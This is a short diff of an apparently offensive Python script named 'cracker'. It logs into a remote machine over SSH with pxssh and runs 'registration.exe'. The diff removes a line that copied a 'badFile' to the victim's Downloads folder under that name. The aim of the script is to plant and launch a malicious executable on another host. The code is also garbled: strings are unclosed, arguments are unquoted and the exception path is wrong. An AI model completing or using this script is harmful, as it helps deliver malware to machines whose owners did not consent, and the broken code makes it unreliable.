@@ -10,13 +10,12 @@ from pexpect import pxssh
 from shutil import copyfile
     
 def cracker(user, ipAddress, badFile, secret ):
-    os.system(scp badFile r"user@IP:~\C:\Users\IEUser\Downloads\registration.exe")
+
  
     
     try:
         s=pxssh.pxssh()
         s.login(ipAddress, user, secret)
-        s.sendline(cd location of file)
         s.sendline(registration.exe)
     except pxssh.Exception.Pxssh as e:
         print (pxssh failed to login")
